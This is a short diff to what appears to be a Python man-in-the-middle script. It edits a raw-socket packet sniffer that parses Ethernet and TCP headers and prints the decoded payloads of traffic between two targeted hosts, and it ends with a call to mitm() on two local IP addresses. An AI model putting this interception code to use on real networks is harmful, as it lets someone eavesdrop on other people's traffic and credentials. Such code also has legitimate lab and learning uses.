@@ -73,7 +73,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         packet = s.recvfrom(65565)
         packet = packet[0]
         ethernet_length = 14
-        eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
+        eth_header = packet[:ethernet_length]
         unpacked_eth = unpack('>6s6sH', eth_header)
 		#  unpacked_eth:
 		#-----------------
@@ -136,9 +136,8 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         header_size = ethAndIP_len + tcp_header_length
 
         data = packet[header_size:]
-		data = unpack('>' + str(len(data)) + 's',data)
 
         if srcIP == Host_One_IP or srcIP == Host_Two_IP or dstIP == Host_One_IP or dstIP == Host_Two_IP:
-            print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
+            print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + data.decode())
 
 mitm('192.168.1.100', '192.168.1.101')
